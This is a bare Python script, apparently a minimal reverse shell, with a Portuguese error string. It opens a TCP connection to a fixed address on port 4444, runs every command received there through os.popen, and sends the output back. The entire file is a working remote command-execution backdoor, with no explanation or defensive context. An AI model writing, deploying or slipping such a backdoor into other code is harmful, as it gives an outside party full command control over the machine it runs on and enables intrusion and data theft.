import socket,os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('192.168.0.103',4444))

while True:
  cmd = sock.recv(1024)
  output = os.popen(cmd).read()
  if output:
    sock.send(output)
  else:
    sock.send('Falha ao executar o comando')
